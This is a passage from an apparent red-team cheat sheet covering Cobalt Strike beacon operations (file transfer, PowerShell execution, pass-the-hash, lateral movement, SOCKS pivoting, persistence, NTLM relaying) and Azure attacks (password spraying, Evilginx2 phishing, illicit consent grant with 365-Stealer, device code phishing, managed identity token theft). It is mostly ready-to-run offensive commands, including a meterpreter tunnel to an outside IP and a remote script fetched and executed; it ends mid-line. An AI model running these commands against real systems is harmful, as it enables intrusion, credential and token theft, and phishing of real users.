Change into the specified working directory beacon \u0026gt; cd [directory] # Delete a file\\folder beacon \u0026gt; rm [file\\folder] # File copy beacon \u0026gt; cp [src] [dest] # Download a file from the path on the Beacon host beacon \u0026gt; download [C:\\filePath] # Lists downloads in progress beacon \u0026gt; downloads # Cancel a download currently in progress beacon \u0026gt; cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon \u0026gt; upload [/path/to/file] Powershell and .NET # Powershell commands # # Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon \u0026gt; powershell-import [/path/to/script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon \u0026gt; powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon \u0026gt; powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon \u0026gt; psinject [pid][arch] [commandlet] [arguments] .NET remote execution # Run a local .NET executable as a Beacon post-exploitation job.\nRequire:\nBinaries compiled with the \u0026ldquo;Any CPU\u0026rdquo; configuration. beacon \u0026gt; execute-assembly [/path/to/script.exe] [arguments] beacon \u0026gt; execute-assembly /home/audit/Rubeus.exe [*] Tasked beacon to run .NET program: Rubeus.exe [+] host called home, sent: 318507 bytes [+] received output: ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.4.2 Lateral Movement # :warning: OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe\nportscan: Performs a portscan on a specific target. runas: A wrapper of runas.exe, using credentials you can run a command as another user. pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. :exclamation: This module needs Administrator privileges. steal_token: Steal a token from a specified process. make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user. jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. :exclamation: The jump module will use the current delegation/impersonation token to authenticate on the remote target. :muscle: We can combine the jump module with the make_token or pth module for a quick \u0026ldquo;jump\u0026rdquo; to another target on the network. remote-exec: Execute a command on a remote target using psexec, winrm or wmi. :exclamation: The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target. ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. :warning: All the commands launch powershell.exe\nBeacon Remote Exploits ====================== jump [module] [target] [listener] psexec\tx86\tUse a service to run a Service EXE artifact psexec64\tx64\tUse a service to run a Service EXE artifact psexec_psh\tx86\tUse a service to run a PowerShell one-liner winrm\tx86\tRun a PowerShell script via WinRM winrm64\tx64\tRun a PowerShell script via WinRM Beacon Remote Execute Methods ============================= remote-exec [module] [target] [command] Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI (PowerShell) Opsec safe Pass-the-Hash:\nmimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:\u0026quot;powershell -w hidden\u0026quot; steal_token PID Assume Control of Artifact # Use link to connect to SMB Beacon Use connect to connect to TCP Beacon VPN \u0026amp; Pivots # :warning: Covert VPN doesn\u0026rsquo;t work with W10, and requires Administrator access to deploy.\nUse socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon\u0026rsquo;s sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.\n# Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage. beacon \u0026gt; socks [PORT] beacon \u0026gt; socks [port] beacon \u0026gt; socks [port] [socks4] beacon \u0026gt; socks [port] [socks5] beacon \u0026gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] beacon \u0026gt; socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging] # Proxy browser traffic through a specified Internet Explorer process. beacon \u0026gt; browserpivot [pid] [x86|x64] # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port. beacon \u0026gt; rportfwd [bind port] [forward host] [forward port] # spunnel : Spawn an agent and create a reverse port forward tunnel to its controller. ~= rportfwd + shspawn. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin beacon\u0026gt; spunnel x64 184.105.181.155 4444 C:\\Payloads\\msf.bin # spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller # then you can handle the connect back on your MSF multi handler beacon\u0026gt; spunnel_local x64 127.0.0.1 4444 C:\\Payloads\\msf.bin Kits # Cobalt Strike Community Kit - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike Elevate Kit # UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)\nbeacon\u0026gt; runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication Persistence Kit # https://github.com/0xthirteen/MoveKit https://github.com/fireeye/SharPersist # List persistences SharPersist -t schtaskbackdoor -m list SharPersist -t startupfolder -m list SharPersist -t schtask -m list # Add a persistence SharPersist -t schtaskbackdoor -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Something Cool\u0026#34; -m add SharPersist -t schtaskbackdoor -n \u0026#34;Something Cool\u0026#34; -m remove SharPersist -t service -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Service\u0026#34; -m add SharPersist -t service -n \u0026#34;Some Service\u0026#34; -m remove SharPersist -t schtask -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Task\u0026#34; -m add SharPersist -t schtask -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Task\u0026#34; -m add -o hourly SharPersist -t schtask -n \u0026#34;Some Task\u0026#34; -m remove Resource Kit # The Resource Kit is Cobalt Strike\u0026rsquo;s means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows\nArtifact Kit # Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -\u0026gt; Script Manager, and load the artifact.cna script from that technique\u0026rsquo;s folder.\nArtifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :\nDownload the artifact kit : Go to Help -\u0026gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike) Install the dependencies : sudo apt-get install mingw-w64 Edit the Artifact code Change pipename strings Change VirtualAlloc in patch.c/patch.exe, e.g: HeapAlloc Change Import Build the Artifact Cobalt Strike -\u0026gt; Script Manager \u0026gt; Load .cna Mimikatz Kit # Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724) Load the mimikatz.cna aggressor script Use mimikatz functions as normal Sleep Mask Kit # The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.\nUse the included build.sh or build.bat script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.\nThread Stack Spoofer # An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.\nThread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option artifactkit_stack_spoof in the config file arsenal_kit.config.\nBeacon Object Files # A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs\nExample: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h\nCompile # To compile this with Visual Studio: cl.exe /c /GS- hello.c /Fohello.o # To compile this with x86 MinGW: i686-w64-mingw32-gcc -c hello.c -o hello.o # To compile this with x64 MinGW: x86_64-w64-mingw32-gcc -c hello.c -o hello.o Execute: inline-execute /path/to/hello.o NTLM Relaying via Cobalt Strike # beacon\u0026gt; socks 1080 kali\u0026gt; proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://\u0026lt;IP_TARGET\u0026gt; beacon\u0026gt; rportfwd_local 8445 \u0026lt;IP_KALI\u0026gt; 445 beacon\u0026gt; upload C:\\Tools\\PortBender\\WinDivert64.sys beacon\u0026gt; PortBender redirect 445 8445 References # Red Team Ops with Cobalt Strike (1 of 9): Operations Red Team Ops with Cobalt Strike (2 of 9): Infrastructure Red Team Ops with Cobalt Strike (3 of 9): C2 Red Team Ops with Cobalt Strike (4 of 9): Weaponization Red Team Ops with Cobalt Strike (5 of 9): Initial Access Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement Red Team Ops with Cobalt Strike (9 of 9): Pivoting A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019 TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018 Cobalt Strike - DNS Beacon How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017 NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse Cobalt Strike - User Guide Cobalt Strike 4.6 - User Guide PDF "},{"id":9,"href":"/docs/microsoft_azure_cloud/","title":"Microsoft's Azure Cloud","section":"Docs","content":" Cloud - Azure # Azure Recon Tools # ROADTool - The Azure AD exploration framework.\npipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] roadrecon auth -u test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -p \u0026lt;PASSWORD\u0026gt; roadrecon gather roadrecon gui Azure/StormSpotter - Azure Red Team tool for graphing Azure and Azure Active Directory objects\n# session 1 - backend pipenv shell python ssbackend.pyz # session 2 - frontend cd C:\\Tools\\stormspotter\\frontend\\dist\\spa\\ quasar.cmd serve -p 9091 --history # session 3 - collector pipenv shell az login -u test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -p \u0026lt;PASSWORD\u0026gt; python C:\\Tools\\stormspotter\\stormcollector\\sscollector.pyz cli # Web access on http://localhost:9091 Username: neo4j Password: BloodHound Server: bolt://localhost:7687 BloodHoundAD/AzureHound - Azure Data Exporter for BloodHound\n./azurehound configure ./azurehound -u \u0026#34;MattNelson@contoso.onmicrosoft.com\u0026#34; -p \u0026#34;MyVerySecurePassword123\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list ./azurehound -u \u0026#34;phisheduser@contoso.onmicrosoft.com\u0026#34; -p \u0026#34;Password1\u0026#34; list -o initial-scan.json --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; ./azurehound -a \u0026#34;6b5adee8-...\u0026#34; -s \u0026#34;\u0026lt;secret\u0026gt;\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list ./azurehound -j \u0026#34;ey...\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list az-ad ./azurehound -r \u0026#34;0.ARwA6Wg...\u0026#34; --tenant \u0026#34;contoso.onmicrosoft.com\u0026#34; list users # List of collections az-ad: Collect all information available at the AzureAD tenant level. In most tenants, all users have the ability to read all this information by default. az-rm: Collect all information available at the AzureRM subscription level. Users do not by default have read access to any of this information. apps: Collects AzureAD application registration objects. devices: Collects AzureAD devices regardless of join type. groups: Collects AzureAD security-enabled groups, both role eligible and non role eligible. key-vaults: Collects AzureRM key vaults. management-groups: Collects AzureRM management group objects resource-groups: Collects AzureRM resource group objects roles: Collects AzureAD admin role objects service-principals: Collects AzureAD service principals subscriptions: Collevts AzureRM subscriptions tenants: Collevts AzureAD tenant objects users: Collects AzureAD users, including any guest users in the target tenant. virtual-machines: Collects AzureRM virtual machines # GUI access bolt://localhost:7687 Username: neo4j Password: BloodHound # Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/ # Cypher query examples: MATCH p = (n)-[r]-\u0026gt;(g:AZKeyVault) RETURN p MATCH (n) WHERE n.azname IS NOT NULL AND n.azname \u0026lt;\u0026gt; \u0026#34;\u0026#34; AND n.name IS NULL SET n.name = n.azname BloodHoundAD/BARK - BloodHound Attack Research Kit\n. .\\BARK.ps1 $MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword -username \u0026#34;user@contoso.onmicrosoft.com\u0026#34; -password \u0026#34;MyVeryCoolPassword\u0026#34; -TenantID \u0026#34;contoso.onmicrosoft.com\u0026#34; $MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID \u0026#34;contoso.onmicrosoft.com\u0026#34; $MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress Microsoft Portals - Microsoft Administrator Sites\nnccgroup/Azucar : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.\n# You should use an account with at least read-permission on the assets you want to access PS\u0026gt; Get-ChildItem -Recurse c:\\Azucar_V10 | Unblock-File PS\u0026gt; .\\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT PS\u0026gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 PS\u0026gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 # resolve the TenantID for an specific username PS\u0026gt; .\\Azucar.ps1 -ResolveTenantUserName user@company.com FSecureLABS/Azurite Explorer and Azurite Visualizer : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.\ngit submodule init git submodule update PS\u0026gt; Import-Module AzureRM PS\u0026gt; Import-Module AzuriteExplorer.ps1 PS\u0026gt; Review-AzureRmSubscription PS\u0026gt; Review-CustomAzureRmSubscription NetSPI/MicroBurst - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping\nPS C:\u0026gt; Import-Module .\\MicroBurst.psm1 PS C:\u0026gt; Import-Module .\\Get-AzureDomainInfo.ps1 PS C:\u0026gt; Get-AzureDomainInfo -folder MicroBurst -Verbose cyberark/SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.\nRequire:\nRead-Only permissions over Azure Directory (Tenant) Read-Only permissions over Subscription Require AZ and AzureAD module or administrator right $ powershell -ExecutionPolicy Bypass -NoProfile PS C\u0026gt; Import-Module .\\SkyArk.ps1 -force PS C\u0026gt; Start-AzureStealth PS C\u0026gt; IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1\u0026#39;) PS C\u0026gt; Scan-AzureAdmins hausec/PowerZure - PowerShell framework to assess Azure security\n# Require az module ! $ ipmo .\\PowerZure $ Set-Subscription -Id [idgoeshere] # Reader $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails # Contributor $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command \u0026#34;whoami\u0026#34; $ Execute-MSBuild -VM Win10Test -ResourceGroup Test-RG -File \u0026#34;build.xml\u0026#34; $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine\u0026#39;s disk # Owner $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest # Administrator $ Create-Backdoor, Execute-Backdoor Terminology # Basic Azure AD terminologies\nTenant: An instance of Azure AD and represents a single organization. Azure AD Directory: Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources. Subscriptions: It is used to pay for services. There can be multiple subscriptions in a Directory. Core Domain: The initial domain name .onmicrosoft.com is the core domain. It is possible to define custom domain names too. Enumeration # Enumerate valid emails # By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.\nValidate email PS\u0026gt; C:\\Python27\\python.exe C:\\Tools\\o365creeper\\o365creeper.py -f C:\\Tools\\emails.txt -o C:\\Tools\\validemails.txt admin@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - VALID root@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - INVALID test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - VALID contact@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com - INVALID Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon Password spraying # PS\u0026gt; . C:\\Tools\\MSOLSpray\\MSOLSpray.ps1 PS\u0026gt; Invoke-MSOLSpray -UserList C:\\Tools\\validemails.txt -Password \u0026lt;PASSWORD\u0026gt; -Verbose Enumerate Azure Subdomains # PS\u0026gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureSubDomains.ps1 PS\u0026gt; Invoke-EnumerateAzureSubDomains -Base \u0026lt;TENANT NAME\u0026gt; -Verbose Subdomain Service --------- ------- \u0026lt;TENANT NAME\u0026gt;.mail.protection.outlook.com Email \u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com Microsoft Hosted Domain Enumerate tenant with Azure AD Powershell # Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 Import-Module C:\\Tools\\AzureADPreview\\AzureADPreview.psd1 PS\u0026gt; $passwd = ConvertTo-SecureString \u0026#34;\u0026lt;PASSWORD\u0026gt;\u0026#34; -AsPlainText -Force PS\u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#34;test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026#34;, $passwd) PS Az\u0026gt; Connect-AzureAD -Credential $creds PS AzureAD\u0026gt; Get-AzureADUser -All $true PS AzureAD\u0026gt; Get-AzureADUser -All $true | select UserPrincipalName PS AzureAD\u0026gt; Get-AzureADGroup -All $true PS AzureAD\u0026gt; Get-AzureADDevice PS AzureAD\u0026gt; Get-AzureADDirectoryRole -Filter \u0026#34;DisplayName eq \u0026#39;Global Administrator\u0026#39;\u0026#34; | Get-AzureADDirectoryRoleMember PS AzureADPreview\u0026gt; Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName Enumerate tenant with Az Powershell # PS\u0026gt; $passwd = ConvertTo-SecureString \u0026#34;\u0026lt;PASSWORD\u0026gt;\u0026#34; -AsPlainText -Force PS\u0026gt; $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026#34;, $passwd) PS Az\u0026gt; Connect-AzAccount -Credential $creds PS Az\u0026gt; Get-AzResource PS Az\u0026gt; Get-AzRoleAssignment -SignInName test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com PS Az\u0026gt; Get-AzVM | fl PS Az\u0026gt; Get-AzWebApp | ?{$_.Kind -notmatch \u0026#34;functionapp\u0026#34;} PS Az\u0026gt; Get-AzFunctionApp PS Az\u0026gt; Get-AzStorageAccount | fl PS Az\u0026gt; Get-AzKeyVault Enumerate tenant with az cli # PS\u0026gt; az login -u test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -p \u0026lt;PASSWORD\u0026gt; PS\u0026gt; az vm list PS\u0026gt; az vm list --query \u0026#34;[].[name]\u0026#34; -o table PS\u0026gt; az webapp list PS\u0026gt; az functionapp list --query \u0026#34;[].[name]\u0026#34; -o table PS\u0026gt; az storage account list PS\u0026gt; az keyvault list Enumerate manually # Federation with Azure AD or O365 https://login.microsoftonline.com/getuserrealm.srf?login=\u0026lt;USER\u0026gt;@\u0026lt;DOMAIN\u0026gt;\u0026amp;xml=1 https://login.microsoftonline.com/getuserrealm.srf?login=root@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026amp;xml=1 Get the Tenant ID https://login.microsoftonline.com/\u0026lt;DOMAIN\u0026gt;/.well-known/openid-configuration https://login.microsoftonline.com/\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com/.well-known/openid-configuration Enumeration methodology # # Check Azure Joined PS\u0026gt; dsregcmd.exe /status +----------------------------------------------------------------------+ | Device State | +----------------------------------------------------------------------+ AzureAdJoined : YES EnterpriseJoined : NO DomainJoined : NO Device Name : jumpvm # Enumerate resources PS Az\u0026gt; Get-AzResource # Enumerate role assignments PS Az\u0026gt; Get-AzRoleAssignment -Scope /subscriptions/\u0026lt;SUBSCRIPTION-ID\u0026gt;/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/\u0026lt;VM-NAME\u0026gt;` # Get info on a role PS Az\u0026gt; Get-AzRoleDefinition -Name \u0026#34;Virtual Machine Command Executor\u0026#34; # Get info user PS AzureAD\u0026gt; Get-AzureADUser -ObjectId \u0026lt;ID\u0026gt; PS AzureAD\u0026gt; Get-AzureADUser -ObjectId test@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com | fl * # List all groups PS AzureAD\u0026gt; Get-AzureADGroup -All $true # Get members of a group PS Az\u0026gt; Get-AzADGroup -DisplayName \u0026#39;\u0026lt;GROUP-NAME\u0026gt;\u0026#39; PS Az\u0026gt; Get-AzADGroupMember -GroupDisplayName \u0026#39;\u0026lt;GROUP-NAME\u0026gt;\u0026#39; | select UserPrincipalName # Get Azure AD information PS\u0026gt; Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals\u0026gt; Get-AADIntLoginInformation -UserName admin@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com PS AADInternals\u0026gt; Get-AADIntTenantID -Domain \u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com # Get Tenant ID PS AADInternals\u0026gt; Invoke-AADIntReconAsOutsider -DomainName \u0026lt;DOMAIN\u0026gt; # Get all the information # Check if there is a user logged-in to az cli PS\u0026gt; az ad signed-in-user show # Check AppID Alternative Names/Display Name PS AzureAD\u0026gt; Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq \u0026#34;\u0026lt;APP-ID\u0026gt;\u0026#34;} | fl # Get all application objects registered using the current tenant PS AzureAD\u0026gt; Get-AzureADApplication -All $true # Get all details about an application PS AzureAD\u0026gt; Get-AzureADApplication -ObjectId \u0026lt;ID\u0026gt; | fl * # List all VM\u0026#39;s the user has access to PS Az\u0026gt; Get-AzVM PS Az\u0026gt; Get-AzVM | fl # Get all function apps PS Az\u0026gt; Get-AzFunctionApp # Get all webapps PS Az\u0026gt; Get-AzWebApp PS Az\u0026gt; Get-AzWebApp | select-object Name, Type, Hostnames # List all storage accounts PS Az\u0026gt; Get-AzStorageAccount PS Az\u0026gt; Get-AzStorageAccount | fl # List all keyvaults PS Az\u0026gt; Get-AzKeyVault Phishing with Evilginx2 # PS C:\\Tools\u0026gt; evilginx2 -p C:\\Tools\\evilginx2\\phishlets : config domain username.corp : config ip 10.10.10.10 : phishlets hostname o365 login.username.corp : phishlets get-hosts o365 Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine # copy certificate and enable the phishing PS C:\\Tools\u0026gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\ca.crt C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.crt PS C:\\Tools\u0026gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\private.key C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.key : phishlets enable o365 # get the phishing URL : lures create o365 : lures get-url 0 Illicit Consent Grant # The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to.\nCheck if users are allowed to consent to apps: PS AzureADPreview\u0026gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole\nDisable user consent : Users cannot grant permissions to applications. Users can consent to apps from verified publishers or your organization, but only for permissions you select : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant Users can consent to all apps : allows all users to consent to any permission which doesn\u0026rsquo;t require admin consent, Custom app consent policy Register Application # Login to https://portal.azure.com \u0026gt; Azure Active Directory Click on App registrations \u0026gt; New registration Enter the Name for our application Under support account types select \u0026ldquo;Accounts in any organizational directory (Any Azure AD directory - Multitenant)\u0026rdquo; Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is https://\u0026lt;DOMAIN/IP\u0026gt;:\u0026lt;PORT\u0026gt;/login/authorized. Click Register and save the Application ID Configure Application # Click on Certificates \u0026amp; secrets Click on New client secret then enter the Description and click on Add. Save the secret\u0026rsquo;s value. Click on API permissions \u0026gt; Add a permission Click on Microsoft Graph \u0026gt; Delegated permissions Search and select the below mentioned permissions and click on Add permission Contacts.Read Mail.Read / Mail.ReadWrite Mail.Send Notes.Read.All Mailboxsettings.ReadWrite Files.ReadWrite.All User.ReadBasic.All User.Read Setup 365-Stealer (Deprecated) # :warning: Default port for 365-Stealer phishing is 443\nRun XAMPP and start Apache Clone 365-Stealer into C:\\xampp\\htdocs\\ git clone https://github.com/AlteredSecurity/365-Stealer.git Install the requirements Python3 PHP CLI or Xampp server pip install -r requirements.txt Enable sqlite3 (Xampp \u0026gt; Apache config \u0026gt; php.ini) and restart Apache Edit C:/xampp/htdocs/yourvictims/index.php if needed Disable IP whitelisting $enableIpWhiteList = false; Go to 365-Stealer Management portal \u0026gt; Configuration (http://localhost:82/365-stealer/yourVictims) Client Id (Mandatory): This will be the Application(Client) Id of the application that we registered. Client Secret (Mandatory): Secret value from the Certificates \u0026amp; secrets tab that we created. Redirect URL (Mandatory): Specify the redirect URL that we entered during registering the App like https://\u0026lt;Domain/IP\u0026gt;/login/authorized Macros Location: Path of macro file that we want to inject. Extension in OneDrive: We can provide file extensions that we want to download from the victims account or provide * to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. Delay: Delay the request by specifying time in seconds while stealing Create a Self Signed Certificate to use HTTPS Run the application either click on the button or run this command : python 365-Stealer.py --run-app --no-ssl: disable HTTPS --port: change the default listening port --token: provide a specific token --refresh-token XXX --client-id YYY --client-secret ZZZ: use a refresh token Find the Phishing URL: go to https://\u0026lt;IP/Domain\u0026gt;:\u0026lt;Port\u0026gt; and click on Read More button or in the console. Setup Vajra # Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target\u0026rsquo;s Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra\nMitigation: Enable Do not allow user consent for applications in the \u0026ldquo;Consent and permissions menu\u0026rdquo;.\nDevice Code Phish # Requirements:\nAzure AD / Office 365 E3 Subscription Exploitation:\nImport TokenTactics: PS C:\\TokenTactics\u0026gt; Import-Module .\\TokenTactics.psd1 Request a device code for the Azure Graph API using TokenTactics: Get-AzureToken -Client Graph Replace \u0026lt;REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS\u0026gt; in the phishing email Leave TokenTactics running in the PowerShell window and send the phishing email Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form Enjoy your Access Token \u0026amp; Refresh Token Token from Managed Identity # MSI_ENDPOINT is an alias for IDENTITY_ENDPOINT, and MSI_SECRET is an alias for IDENTITY_HEADER.\nFind IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : env\nMost of the time, you want a token for one of these resources:\nhttps://storage.azure.com https://vault.azure.net https://graph.microsoft.com https://management.azure.com Azure API via Powershell # Get access_token from IDENTITY_HEADER and IDENTITY_ENDPOINT: system('curl \u0026quot;$IDENTITY_ENDPOINT?resource=https://management.azure.com/\u0026amp;api-version=2017-09-01\u0026quot; -H secret:$IDENTITY_HEADER');.\nThen query the Azure REST API to get the subscription ID and more .\n$Token = \u0026#39;eyJ0eX..\u0026#39; $URI = \u0026#39;https://management.azure.com/subscriptions?api-version=2020-01-01\u0026#39; # $URI = \u0026#39;https://graph.microsoft.com/v1.0/applications\u0026#39; $RequestParams = @{ Method = \u0026#39;GET\u0026#39; Uri = $URI Headers = @{ \u0026#39;Authorization\u0026#39; = \u0026#34;Bearer $Token\u0026#34; } } (Invoke-RestMethod @RequestParams).value # List resources and check for runCommand privileges $URI = \u0026#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01\u0026#39; $URI = 